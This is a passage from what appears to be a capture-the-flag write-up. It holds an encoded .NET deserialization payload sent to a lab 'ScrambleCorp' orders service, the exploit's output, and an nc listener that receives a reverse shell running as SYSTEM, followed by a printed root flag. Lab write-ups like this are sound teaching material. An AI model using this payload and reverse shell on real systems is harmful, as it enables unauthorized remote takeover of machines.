RHRnVaR0Z5WkVWeWNtOXlSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJUZEdGdVpHRnlaRTkxZEhCMWRFVnVZMjlrYVc1blBTSjdlRHBPZFd4c2ZTSWdWWE5sY2s1aGJXVTlJaUlnVUdGemMzZHZjbVE5SW50NE9rNTFiR3g5SWlCRWIyMWhhVzQ5SWlJZ1RHOWhaRlZ6WlhKUWNtOW1hV3hsUFNKR1lXeHpaU0lnUm1sc1pVNWhiV1U5SW1OdFpDSWdMejROQ2lBZ0lDQWdJRHd2YzJRNlVISnZZMlZ6Y3k1VGRHRnlkRWx1Wm04K0RRb2dJQ0FnUEM5elpEcFFjbTlqWlhOelBnMEtJQ0E4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1UFltcGxZM1JKYm5OMFlXNWpaVDROQ2p3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeVBncz0L"
Banner: SCRAMBLECORP_ORDERS_V1.0.3;
Sending auth: AUTH;scrmdev|anything
Auth response: ERROR_UNKNOWN_COMMAND;
Sending malicious payload...
Upload response: ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.
Exploit completed
```

```bash
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.161.93] 60554

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> cat c:\users\administrator\desktop\root.txt
992a6ecec03084740bc01e8c14978841
```

---
